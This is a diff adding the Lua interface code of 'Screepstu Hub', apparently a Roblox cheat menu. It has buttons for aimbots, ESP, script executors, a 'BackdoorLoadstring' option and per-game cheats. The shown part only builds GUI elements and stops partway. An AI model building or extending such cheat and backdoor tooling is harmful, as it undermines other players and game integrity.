@@ -1,0 +1,3340 @@
+local dapatkan_Screepstu_Hub = game.CoreGui:FindFirstChild("ScreepstuHub")
+
+if dapatkan_Screepstu_Hub then
+	dapatkan_Screepstu_Hub:Destroy()
+else
+	warn("Misi selesai, Screepstu Hub tidak ditemui dalam Core GUI")
+
+	local StarterGui = game.StarterGui
+
+	local aa = Instance.new('Sound', game.ReplicatedFirst)
+	aa.SoundId = "rbxassetid://8470808181"
+	aa.Volume = 1
+	aa:Play()
+
+	StarterGui:SetCore("SendNotification", {
+		Title = "Hification";
+		Text = "Hello there!";
+		Duration = aa.TimeLength;
+	})
+
+	aa.Ended:Connect(function()
+		aa:Destroy()
+	end)
+end
+
+-- Contoh-contoh:
+
+local ScreepstuHub = {
+	ScreepstuHub = Instance.new("ScreenGui"),
+	MainTop = Instance.new("Frame"),
+	Icon = Instance.new("ImageLabel"),
+	LabelAndTitle = Instance.new("TextLabel"),
+	UIPadding = Instance.new("UIPadding"),
+	Close = Instance.new("TextButton"),
+	UITextSizeConstraint = Instance.new("UITextSizeConstraint"),
+	Minimise = Instance.new("TextButton"),
+	UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint"),
+	Exit = Instance.new("TextButton"),
+	UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint"),
+	VisibleContainer = Instance.new("TextButton"),
+	UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint"),
+	Tab = Instance.new("Frame"),
+	T1 = Instance.new("TextButton"),
+	Horiz_Line = Instance.new("Frame"),
+	UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint"),
+	UIListLayout = Instance.new("UIListLayout"),
+	T2 = Instance.new("TextButton"),
+	Horiz_Line_2 = Instance.new("Frame"),
+	UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint"),
+	T3 = Instance.new("TextButton"),
+	Horiz_Line_3 = Instance.new("Frame"),
+	UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint"),
+	T4 = Instance.new("TextButton"),
+	Horiz_Line_4 = Instance.new("Frame"),
+	UITextSizeConstraint_8 = Instance.new("UITextSizeConstraint"),
+	T5 = Instance.new("TextButton"),
+	Horiz_Line_5 = Instance.new("Frame"),
+	UITextSizeConstraint_9 = Instance.new("UITextSizeConstraint"),
+	Verti_Line = Instance.new("Frame"),
+	Horiz_Line_6 = Instance.new("Frame"),
+	RestoreUp = Instance.new("ImageButton"),
+	UIStroke = Instance.new("UIStroke"),
+	DropShadowHolder = Instance.new("Frame"),
+	DropShadow = Instance.new("ImageLabel"),
+	Container2 = Instance.new("Frame"),
+	UIGridLayout = Instance.new("UIGridLayout"),
+	UIPadding_2 = Instance.new("UIPadding"),
+	AimbotV3 = Instance.new("TextButton"),
+	UIStroke_2 = Instance.new("UIStroke"),
+	UITextSizeConstraint_10 = Instance.new("UITextSizeConstraint"),
+	AntiLag = Instance.new("TextButton"),
+	UIStroke_3 = Instance.new("UIStroke"),
+	UITextSizeConstraint_11 = Instance.new("UITextSizeConstraint"),
+	BetterRoblox = Instance.new("TextButton"),
+	UIStroke_4 = Instance.new("UIStroke"),
+	UITextSizeConstraint_12 = Instance.new("UITextSizeConstraint"),
+	CMDX = Instance.new("TextButton"),
+	UIStroke_5 = Instance.new("UIStroke"),
+	UITextSizeConstraint_13 = Instance.new("UITextSizeConstraint"),
+	DExplorer = Instance.new("TextButton"),
+	UIStroke_6 = Instance.new("UIStroke"),
+	UITextSizeConstraint_14 = Instance.new("UITextSizeConstraint"),
+	DomainX = Instance.new("TextButton"),
+	UIStroke_7 = Instance.new("UIStroke"),
+	UITextSizeConstraint_15 = Instance.new("UITextSizeConstraint"),
+	Hydroxide = Instance.new("TextButton"),
+	UIStroke_8 = Instance.new("UIStroke"),
+	UITextSizeConstraint_16 = Instance.new("UITextSizeConstraint"),
+	InfiniteYield = Instance.new("TextButton"),
+	UIStroke_9 = Instance.new("UIStroke"),
+	UITextSizeConstraint_17 = Instance.new("UITextSizeConstraint"),
+	NexusWeaponry = Instance.new("TextButton"),
+	UIStroke_10 = Instance.new("UIStroke"),
+	UITextSizeConstraint_18 = Instance.new("UITextSizeConstraint"),
+	SecureDex = Instance.new("TextButton"),
+	UIStroke_11 = Instance.new("UIStroke"),
+	UITextSizeConstraint_19 = Instance.new("UITextSizeConstraint"),
+	UnnamedESP = Instance.new("TextButton"),
+	UIStroke_12 = Instance.new("UIStroke"),
+	UITextSizeConstraint_20 = Instance.new("UITextSizeConstraint"),
+	WRDAimbot = Instance.new("TextButton"),
+	UIStroke_13 = Instance.new("UIStroke"),
+	UITextSizeConstraint_21 = Instance.new("UITextSizeConstraint"),
+	WRDESP = Instance.new("TextButton"),
+	UIStroke_14 = Instance.new("UIStroke"),
+	UITextSizeConstraint_22 = Instance.new("UITextSizeConstraint"),
+	Container3 = Instance.new("Frame"),
+	UIGridLayout_2 = Instance.new("UIGridLayout"),
+	UIPadding_3 = Instance.new("UIPadding"),
+	Arsenal = Instance.new("TextButton"),
+	ImageLabel = Instance.new("ImageLabel"),
+	TextLabel = Instance.new("TextLabel"),
+	UITextSizeConstraint_23 = Instance.new("UITextSizeConstraint"),
+	UIStroke_15 = Instance.new("UIStroke"),
+	BananaEats = Instance.new("TextButton"),
+	ImageLabel_2 = Instance.new("ImageLabel"),
+	TextLabel_2 = Instance.new("TextLabel"),
+	UITextSizeConstraint_24 = Instance.new("UITextSizeConstraint"),
+	UIStroke_16 = Instance.new("UIStroke"),
+	BrookhavenRP = Instance.new("TextButton"),
+	ImageLabel_3 = Instance.new("ImageLabel"),
+	TextLabel_3 = Instance.new("TextLabel"),
+	UITextSizeConstraint_25 = Instance.new("UITextSizeConstraint"),
+	UIStroke_17 = Instance.new("UIStroke"),
+	ClownKilling = Instance.new("TextButton"),
+	ImageLabel_4 = Instance.new("ImageLabel"),
+	TextLabel_4 = Instance.new("TextLabel"),
+	UITextSizeConstraint_26 = Instance.new("UITextSizeConstraint"),
+	UIStroke_18 = Instance.new("UIStroke"),
+	DollhouseRP = Instance.new("TextButton"),
+	ImageLabel_5 = Instance.new("ImageLabel"),
+	TextLabel_5 = Instance.new("TextLabel"),
+	UITextSizeConstraint_27 = Instance.new("UITextSizeConstraint"),
+	UIStroke_19 = Instance.new("UIStroke"),
+	FreeRadio = Instance.new("TextButton"),
+	ImageLabel_6 = Instance.new("ImageLabel"),
+	TextLabel_6 = Instance.new("TextLabel"),
+	UITextSizeConstraint_28 = Instance.new("UITextSizeConstraint"),
+	UIStroke_20 = Instance.new("UIStroke"),
+	HideNSeekExtreme = Instance.new("TextButton"),
+	ImageLabel_7 = Instance.new("ImageLabel"),
+	TextLabel_7 = Instance.new("TextLabel"),
+	UITextSizeConstraint_29 = Instance.new("UITextSizeConstraint"),
+	UIStroke_21 = Instance.new("UIStroke"),
+	HoldPeopleTheGame = Instance.new("TextButton"),
+	ImageLabel_8 = Instance.new("ImageLabel"),
+	TextLabel_8 = Instance.new("TextLabel"),
+	UITextSizeConstraint_30 = Instance.new("UITextSizeConstraint"),
+	UIStroke_22 = Instance.new("UIStroke"),
+	MurderMystery2 = Instance.new("TextButton"),
+	ImageLabel_9 = Instance.new("ImageLabel"),
+	TextLabel_9 = Instance.new("TextLabel"),
+	UITextSizeConstraint_31 = Instance.new("UITextSizeConstraint"),
+	UIStroke_23 = Instance.new("UIStroke"),
+	MurderMysteryXFreeRadioNHunter2 = Instance.new("TextButton"),
+	ImageLabel_10 = Instance.new("ImageLabel"),
+	TextLabel_10 = Instance.new("TextLabel"),
+	UITextSizeConstraint_32 = Instance.new("UITextSizeConstraint"),
+	UIStroke_24 = Instance.new("UIStroke"),
+	SniperBeta = Instance.new("TextButton"),
+	ImageLabel_11 = Instance.new("ImageLabel"),
+	TextLabel_11 = Instance.new("TextLabel"),
+	UITextSizeConstraint_33 = Instance.new("UITextSizeConstraint"),
+	UIStroke_25 = Instance.new("UIStroke"),
+	StopItSlender = Instance.new("TextButton"),
+	ImageLabel_12 = Instance.new("ImageLabel"),
+	TextLabel_12 = Instance.new("TextLabel"),
+	UITextSizeConstraint_34 = Instance.new("UITextSizeConstraint"),
+	UIStroke_26 = Instance.new("UIStroke"),
+	TowerOfFun = Instance.new("TextButton"),
+	ImageLabel_13 = Instance.new("ImageLabel"),
+	TextLabel_13 = Instance.new("TextLabel"),
+	UITextSizeConstraint_35 = Instance.new("UITextSizeConstraint"),
+	UIStroke_27 = Instance.new("UIStroke"),
+	Container1 = Instance.new("Frame"),
+	Health = Instance.new("TextBox"),
+	UIStroke_28 = Instance.new("UIStroke"),
+	UITextSizeConstraint_36 = Instance.new("UITextSizeConstraint"),
+	HipHeight = Instance.new("TextBox"),
+	UIStroke_29 = Instance.new("UIStroke"),
+	UITextSizeConstraint_37 = Instance.new("UITextSizeConstraint"),
+	MaxSlopeAngle = Instance.new("TextBox"),
+	UIStroke_30 = Instance.new("UIStroke"),
+	UITextSizeConstraint_38 = Instance.new("UITextSizeConstraint"),
+	WalkSpeed = Instance.new("TextBox"),
+	UIStroke_31 = Instance.new("UIStroke"),
+	UITextSizeConstraint_39 = Instance.new("UITextSizeConstraint"),
+	JumpPower = Instance.new("TextBox"),
+	UIStroke_32 = Instance.new("UIStroke"),
+	UITextSizeConstraint_40 = Instance.new("UITextSizeConstraint"),
+	Sit = Instance.new("TextButton"),
+	UIStroke_33 = Instance.new("UIStroke"),
+	UITextSizeConstraint_41 = Instance.new("UITextSizeConstraint"),
+	Jump = Instance.new("TextButton"),
+	UIStroke_34 = Instance.new("UIStroke"),
+	UITextSizeConstraint_42 = Instance.new("UITextSizeConstraint"),
+	ResetCharacter = Instance.new("TextButton"),
+	UIStroke_35 = Instance.new("UIStroke"),
+	UITextSizeConstraint_43 = Instance.new("UITextSizeConstraint"),
+	Container4 = Instance.new("Frame"),
+	UIGridLayout_3 = Instance.new("UIGridLayout"),
+	UIPadding_4 = Instance.new("UIPadding"),
+	UIPadding_5 = Instance.new("UIPadding"),
+	UIGridLayout_4 = Instance.new("UIGridLayout"),
+	FieldofView = Instance.new("TextBox"),
+	UIStroke_36 = Instance.new("UIStroke"),
+	UITextSizeConstraint_44 = Instance.new("UITextSizeConstraint"),
+	Freeze = Instance.new("TextButton"),
+	UIStroke_37 = Instance.new("UIStroke"),
+	UITextSizeConstraint_45 = Instance.new("UITextSizeConstraint"),
+	Container4_2 = Instance.new("Frame"),
+	UIGridLayout_5 = Instance.new("UIGridLayout"),
+	UIPadding_6 = Instance.new("UIPadding"),
+	BackdoorLoadstring = Instance.new("TextButton"),
+	UIStroke_38 = Instance.new("UIStroke"),
+	UITextSizeConstraint_46 = Instance.new("UITextSizeConstraint"),
+	FrontflipNBackflip = Instance.new("TextButton"),
+	UIStroke_39 = Instance.new("UIStroke"),
+	UITextSizeConstraint_47 = Instance.new("UITextSizeConstraint"),
+	WalkOnWalls = Instance.new("TextButton"),
+	UIStroke_40 = Instance.new("UIStroke"),
+	UITextSizeConstraint_48 = Instance.new("UITextSizeConstraint"),
+	TAS = Instance.new("TextButton"),
+	UIStroke_41 = Instance.new("UIStroke"),
+	UITextSizeConstraint_49 = Instance.new("UITextSizeConstraint"),
+	ClownKidnap = Instance.new("TextBox"),
+	UIStroke_42 = Instance.new("UIStroke"),
+	UITextSizeConstraint_50 = Instance.new("UITextSizeConstraint"),
+	HDAdmin = Instance.new("TextBox"),
+	UIStroke_43 = Instance.new("UIStroke"),
+	UITextSizeConstraint_51 = Instance.new("UITextSizeConstraint"),
+	InfectionVirus = Instance.new("TextBox"),
+	UIStroke_44 = Instance.new("UIStroke"),
+	NootnootKiller = Instance.new("TextBox"),
+	UIStroke_45 = Instance.new("UIStroke"),
+	UITextSizeConstraint_52 = Instance.new("UITextSizeConstraint"),
+	Container5 = Instance.new("Frame"),
+	UIGridLayout_6 = Instance.new("UIGridLayout"),
+	UIPadding_7 = Instance.new("UIPadding"),
+	AstraHub = Instance.new("TextButton"),
+	UIStroke_46 = Instance.new("UIStroke"),
+	UITextSizeConstraint_53 = Instance.new("UITextSizeConstraint"),
+	DemonicHub = Instance.new("TextButton"),
+	UIStroke_47 = Instance.new("UIStroke"),
+	UITextSizeConstraint_54 = Instance.new("UITextSizeConstraint"),
+	OwlHub = Instance.new("TextButton"),
+	UIStroke_48 = Instance.new("UIStroke"),
+	UITextSizeConstraint_55 = Instance.new("UITextSizeConstraint"),
+	ScreepstuHub_2 = Instance.new("TextButton"),
+	UIStroke_49 = Instance.new("UIStroke"),
+	UITextSizeConstraint_56 = Instance.new("UITextSizeConstraint"),
+	ReaperHub = Instance.new("TextButton"),
+	UIStroke_50 = Instance.new("UIStroke"),
+	UITextSizeConstraint_57 = Instance.new("UITextSizeConstraint"),
+	RedzHub = Instance.new("TextButton"),
+	UIStroke_51 = Instance.new("UIStroke"),
+	UITextSizeConstraint_58 = Instance.new("UITextSizeConstraint"),
+	ZapHub = Instance.new("TextButton"),
+	UIStroke_52 = Instance.new("UIStroke"),
+	UITextSizeConstraint_59 = Instance.new("UITextSizeConstraint"),
+	SpaceHub = Instance.new("TextButton"),
+	UIStroke_53 = Instance.new("UIStroke"),
+	UITextSizeConstraint_60 = Instance.new("UITextSizeConstraint"),
+	SolarisHub = Instance.new("TextButton"),
+	UIStroke_54 = Instance.new("UIStroke"),
+	UITextSizeConstraint_61 = Instance.new("UITextSizeConstraint"),
+	ShifeHub = Instance.new("TextButton"),
+	UIStroke_55 = Instance.new("UIStroke"),
+	UITextSizeConstraint_62 = Instance.new("UITextSizeConstraint"),
+}
+
+-- Hartanah:
+
+ScreepstuHub.ScreepstuHub.Name = "ScreepstuHub"
+
+ScreepstuHub.MainTop.Name = "MainTop"
+ScreepstuHub.MainTop.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.MainTop.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.MainTop.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.MainTop.BorderSizePixel = 0
+ScreepstuHub.MainTop.Size = UDim2.new(1, 0, 0, 30)
+
+ScreepstuHub.Icon.Name = "Icon"
+ScreepstuHub.Icon.Parent = ScreepstuHub.MainTop
+ScreepstuHub.Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.Icon.BackgroundTransparency = 1.000
+ScreepstuHub.Icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Icon.BorderSizePixel = 0
+ScreepstuHub.Icon.Size = UDim2.new(0, 29, 0, 29)
+ScreepstuHub.Icon.ZIndex = 3
+ScreepstuHub.Icon.Image = "rbxassetid://4838075912"
+
+ScreepstuHub.LabelAndTitle.Name = "LabelAndTitle"
+ScreepstuHub.LabelAndTitle.Parent = ScreepstuHub.MainTop
+ScreepstuHub.LabelAndTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.LabelAndTitle.BackgroundTransparency = 1.000
+ScreepstuHub.LabelAndTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.LabelAndTitle.BorderSizePixel = 0
+ScreepstuHub.LabelAndTitle.Position = UDim2.new(0, 29, 0, 0)
+ScreepstuHub.LabelAndTitle.Size = UDim2.new(0, 360, 0, 29)
+ScreepstuHub.LabelAndTitle.ZIndex = 3
+ScreepstuHub.LabelAndTitle.Font = Enum.Font.Arial
+ScreepstuHub.LabelAndTitle.Text = "Screepstu Hub"
+ScreepstuHub.LabelAndTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.LabelAndTitle.TextSize = 14.000
+ScreepstuHub.LabelAndTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+ScreepstuHub.UIPadding.Parent = ScreepstuHub.LabelAndTitle
+ScreepstuHub.UIPadding.PaddingLeft = UDim.new(0, 8)
+
+ScreepstuHub.Close.Name = "Close"
+ScreepstuHub.Close.Parent = ScreepstuHub.MainTop
+ScreepstuHub.Close.AnchorPoint = Vector2.new(1, 0)
+ScreepstuHub.Close.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Close.BorderSizePixel = 0
+ScreepstuHub.Close.Position = UDim2.new(1, 0, 0, 0)
+ScreepstuHub.Close.Size = UDim2.new(0, 39, 0, 29)
+ScreepstuHub.Close.ZIndex = 3
+ScreepstuHub.Close.Font = Enum.Font.Arial
+ScreepstuHub.Close.Text = "X"
+ScreepstuHub.Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.Close.TextScaled = true
+ScreepstuHub.Close.TextSize = 14.000
+ScreepstuHub.Close.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint.Parent = ScreepstuHub.Close
+ScreepstuHub.UITextSizeConstraint.MaxTextSize = 14
+
+ScreepstuHub.Minimise.Name = "Minimise"
+ScreepstuHub.Minimise.Parent = ScreepstuHub.MainTop
+ScreepstuHub.Minimise.AnchorPoint = Vector2.new(1, 0)
+ScreepstuHub.Minimise.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Minimise.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Minimise.BorderSizePixel = 0
+ScreepstuHub.Minimise.Position = UDim2.new(1, -117, 0, 0)
+ScreepstuHub.Minimise.Size = UDim2.new(0, 39, 0, 29)
+ScreepstuHub.Minimise.ZIndex = 3
+ScreepstuHub.Minimise.Font = Enum.Font.Arial
+ScreepstuHub.Minimise.Text = "_"
+ScreepstuHub.Minimise.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.Minimise.TextScaled = true
+ScreepstuHub.Minimise.TextSize = 14.000
+ScreepstuHub.Minimise.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_2.Parent = ScreepstuHub.Minimise
+ScreepstuHub.UITextSizeConstraint_2.MaxTextSize = 14
+
+ScreepstuHub.Exit.Name = "Exit"
+ScreepstuHub.Exit.Parent = ScreepstuHub.MainTop
+ScreepstuHub.Exit.AnchorPoint = Vector2.new(1, 0)
+ScreepstuHub.Exit.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Exit.BorderSizePixel = 0
+ScreepstuHub.Exit.Position = UDim2.new(1, -39, 0, 0)
+ScreepstuHub.Exit.Size = UDim2.new(0, 39, 0, 29)
+ScreepstuHub.Exit.ZIndex = 3
+ScreepstuHub.Exit.Font = Enum.Font.Arial
+ScreepstuHub.Exit.Text = "E"
+ScreepstuHub.Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.Exit.TextScaled = true
+ScreepstuHub.Exit.TextSize = 14.000
+ScreepstuHub.Exit.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_3.Parent = ScreepstuHub.Exit
+ScreepstuHub.UITextSizeConstraint_3.MaxTextSize = 14
+
+ScreepstuHub.VisibleContainer.Name = "VisibleContainer"
+ScreepstuHub.VisibleContainer.Parent = ScreepstuHub.MainTop
+ScreepstuHub.VisibleContainer.AnchorPoint = Vector2.new(1, 0)
+ScreepstuHub.VisibleContainer.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.VisibleContainer.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.VisibleContainer.BorderSizePixel = 0
+ScreepstuHub.VisibleContainer.Position = UDim2.new(1, -78, 0, 0)
+ScreepstuHub.VisibleContainer.Size = UDim2.new(0, 39, 0, 29)
+ScreepstuHub.VisibleContainer.ZIndex = 3
+ScreepstuHub.VisibleContainer.Font = Enum.Font.Arial
+ScreepstuHub.VisibleContainer.Text = "V"
+ScreepstuHub.VisibleContainer.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.VisibleContainer.TextScaled = true
+ScreepstuHub.VisibleContainer.TextSize = 14.000
+ScreepstuHub.VisibleContainer.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_4.Parent = ScreepstuHub.VisibleContainer
+ScreepstuHub.UITextSizeConstraint_4.MaxTextSize = 14
+
+ScreepstuHub.Tab.Name = "Tab"
+ScreepstuHub.Tab.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Tab.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Tab.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Tab.BorderSizePixel = 0
+ScreepstuHub.Tab.Position = UDim2.new(0, 0, 0, 30)
+ScreepstuHub.Tab.Size = UDim2.new(0, 100, 1, -30)
+
+ScreepstuHub.T1.Name = "T1"
+ScreepstuHub.T1.Parent = ScreepstuHub.Tab
+ScreepstuHub.T1.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.T1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.T1.BorderSizePixel = 0
+ScreepstuHub.T1.Position = UDim2.new(0, 0, 0, 1)
+ScreepstuHub.T1.Size = UDim2.new(0, 100, 0, 69)
+ScreepstuHub.T1.Font = Enum.Font.Arial
+ScreepstuHub.T1.Text = "Local Player"
+ScreepstuHub.T1.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.T1.TextScaled = true
+ScreepstuHub.T1.TextSize = 14.000
+ScreepstuHub.T1.TextWrapped = true
+
+ScreepstuHub.Horiz_Line.Name = "Horiz_Line"
+ScreepstuHub.Horiz_Line.Parent = ScreepstuHub.T1
+ScreepstuHub.Horiz_Line.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+ScreepstuHub.Horiz_Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Horiz_Line.BorderSizePixel = 0
+ScreepstuHub.Horiz_Line.Position = UDim2.new(0, 0, 1, -1)
+ScreepstuHub.Horiz_Line.Size = UDim2.new(1, 0, 0, 2)
+ScreepstuHub.Horiz_Line.ZIndex = 2
+
+ScreepstuHub.UITextSizeConstraint_5.Parent = ScreepstuHub.T1
+ScreepstuHub.UITextSizeConstraint_5.MaxTextSize = 14
+
+ScreepstuHub.UIListLayout.Parent = ScreepstuHub.Tab
+ScreepstuHub.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ScreepstuHub.UIListLayout.Padding = UDim.new(0, 1)
+
+ScreepstuHub.T2.Name = "T2"
+ScreepstuHub.T2.Parent = ScreepstuHub.Tab
+ScreepstuHub.T2.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.T2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.T2.BorderSizePixel = 0
+ScreepstuHub.T2.Position = UDim2.new(0, 0, 0, 1)
+ScreepstuHub.T2.Size = UDim2.new(0, 100, 0, 69)
+ScreepstuHub.T2.Font = Enum.Font.Arial
+ScreepstuHub.T2.Text = "Requirements"
+ScreepstuHub.T2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.T2.TextScaled = true
+ScreepstuHub.T2.TextSize = 14.000
+ScreepstuHub.T2.TextWrapped = true
+
+ScreepstuHub.Horiz_Line_2.Name = "Horiz_Line"
+ScreepstuHub.Horiz_Line_2.Parent = ScreepstuHub.T2
+ScreepstuHub.Horiz_Line_2.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+ScreepstuHub.Horiz_Line_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Horiz_Line_2.BorderSizePixel = 0
+ScreepstuHub.Horiz_Line_2.Position = UDim2.new(0, 0, 1, -1)
+ScreepstuHub.Horiz_Line_2.Size = UDim2.new(1, 0, 0, 2)
+ScreepstuHub.Horiz_Line_2.ZIndex = 2
+
+ScreepstuHub.UITextSizeConstraint_6.Parent = ScreepstuHub.T2
+ScreepstuHub.UITextSizeConstraint_6.MaxTextSize = 14
+
+ScreepstuHub.T3.Name = "T3"
+ScreepstuHub.T3.Parent = ScreepstuHub.Tab
+ScreepstuHub.T3.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.T3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.T3.BorderSizePixel = 0
+ScreepstuHub.T3.Position = UDim2.new(0, 0, 0, 1)
+ScreepstuHub.T3.Size = UDim2.new(0, 100, 0, 69)
+ScreepstuHub.T3.Font = Enum.Font.Arial
+ScreepstuHub.T3.Text = "Games"
+ScreepstuHub.T3.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.T3.TextScaled = true
+ScreepstuHub.T3.TextSize = 14.000
+ScreepstuHub.T3.TextWrapped = true
+
+ScreepstuHub.Horiz_Line_3.Name = "Horiz_Line"
+ScreepstuHub.Horiz_Line_3.Parent = ScreepstuHub.T3
+ScreepstuHub.Horiz_Line_3.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+ScreepstuHub.Horiz_Line_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Horiz_Line_3.BorderSizePixel = 0
+ScreepstuHub.Horiz_Line_3.Position = UDim2.new(0, 0, 1, -1)
+ScreepstuHub.Horiz_Line_3.Size = UDim2.new(1, 0, 0, 2)
+ScreepstuHub.Horiz_Line_3.ZIndex = 2
+
+ScreepstuHub.UITextSizeConstraint_7.Parent = ScreepstuHub.T3
+ScreepstuHub.UITextSizeConstraint_7.MaxTextSize = 14
+
+ScreepstuHub.T4.Name = "T4"
+ScreepstuHub.T4.Parent = ScreepstuHub.Tab
+ScreepstuHub.T4.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.T4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.T4.BorderSizePixel = 0
+ScreepstuHub.T4.Position = UDim2.new(0, 0, 0, 1)
+ScreepstuHub.T4.Size = UDim2.new(0, 100, 0, 69)
+ScreepstuHub.T4.Font = Enum.Font.Arial
+ScreepstuHub.T4.Text = "Universals"
+ScreepstuHub.T4.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.T4.TextScaled = true
+ScreepstuHub.T4.TextSize = 14.000
+ScreepstuHub.T4.TextWrapped = true
+
+ScreepstuHub.Horiz_Line_4.Name = "Horiz_Line"
+ScreepstuHub.Horiz_Line_4.Parent = ScreepstuHub.T4
+ScreepstuHub.Horiz_Line_4.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+ScreepstuHub.Horiz_Line_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Horiz_Line_4.BorderSizePixel = 0
+ScreepstuHub.Horiz_Line_4.Position = UDim2.new(0, 0, 1, -1)
+ScreepstuHub.Horiz_Line_4.Size = UDim2.new(1, 0, 0, 2)
+ScreepstuHub.Horiz_Line_4.ZIndex = 2
+
+ScreepstuHub.UITextSizeConstraint_8.Parent = ScreepstuHub.T4
+ScreepstuHub.UITextSizeConstraint_8.MaxTextSize = 14
+
+ScreepstuHub.T5.Name = "T5"
+ScreepstuHub.T5.Parent = ScreepstuHub.Tab
+ScreepstuHub.T5.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.T5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.T5.BorderSizePixel = 0
+ScreepstuHub.T5.Position = UDim2.new(0, 0, 0, 1)
+ScreepstuHub.T5.Size = UDim2.new(0, 100, 0, 69)
+ScreepstuHub.T5.Font = Enum.Font.Arial
+ScreepstuHub.T5.Text = "Hubs"
+ScreepstuHub.T5.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.T5.TextScaled = true
+ScreepstuHub.T5.TextSize = 14.000
+ScreepstuHub.T5.TextWrapped = true
+
+ScreepstuHub.Horiz_Line_5.Name = "Horiz_Line"
+ScreepstuHub.Horiz_Line_5.Parent = ScreepstuHub.T5
+ScreepstuHub.Horiz_Line_5.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+ScreepstuHub.Horiz_Line_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Horiz_Line_5.BorderSizePixel = 0
+ScreepstuHub.Horiz_Line_5.Position = UDim2.new(0, 0, 1, -1)
+ScreepstuHub.Horiz_Line_5.Size = UDim2.new(1, 0, 0, 2)
+ScreepstuHub.Horiz_Line_5.ZIndex = 2
+
+ScreepstuHub.UITextSizeConstraint_9.Parent = ScreepstuHub.T5
+ScreepstuHub.UITextSizeConstraint_9.MaxTextSize = 14
+
+ScreepstuHub.Verti_Line.Name = "Verti_Line"
+ScreepstuHub.Verti_Line.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Verti_Line.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+ScreepstuHub.Verti_Line.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Verti_Line.BorderSizePixel = 0
+ScreepstuHub.Verti_Line.Position = UDim2.new(0, 100, 0, 30)
+ScreepstuHub.Verti_Line.Size = UDim2.new(0, 2, 1, -30)
+ScreepstuHub.Verti_Line.ZIndex = 2
+
+ScreepstuHub.Horiz_Line_6.Name = "Horiz_Line"
+ScreepstuHub.Horiz_Line_6.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Horiz_Line_6.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+ScreepstuHub.Horiz_Line_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Horiz_Line_6.BorderSizePixel = 0
+ScreepstuHub.Horiz_Line_6.Position = UDim2.new(0, 0, 0, 29)
+ScreepstuHub.Horiz_Line_6.Size = UDim2.new(1, 0, 0, 2)
+ScreepstuHub.Horiz_Line_6.ZIndex = 2
+
+ScreepstuHub.RestoreUp.Name = "RestoreUp"
